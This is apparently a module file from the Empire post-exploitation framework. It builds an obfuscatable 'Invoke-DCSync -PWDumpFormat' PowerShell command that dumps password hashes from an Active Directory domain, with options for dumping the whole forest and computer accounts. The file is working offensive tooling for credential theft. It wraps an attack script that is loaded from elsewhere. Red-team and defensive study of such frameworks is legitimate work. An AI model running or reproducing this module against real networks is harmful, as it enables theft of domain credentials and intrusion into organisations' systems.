from __future__ import print_function

import pathlib
from builtins import object, str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: PydanticModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = "Invoke-DCSync -PWDumpFormat "

        if params["Domain"] != "":
            script_end += " -Domain " + params["Domain"]

        if params["Forest"] != "":
            script_end += " -DumpForest "

        if params["Computers"] != "":
            script_end += " -GetComputers "

        if params["Active"] == "":
            script_end += " -OnlyActive:$false "

        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf};"

        script = main_menu.modules.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
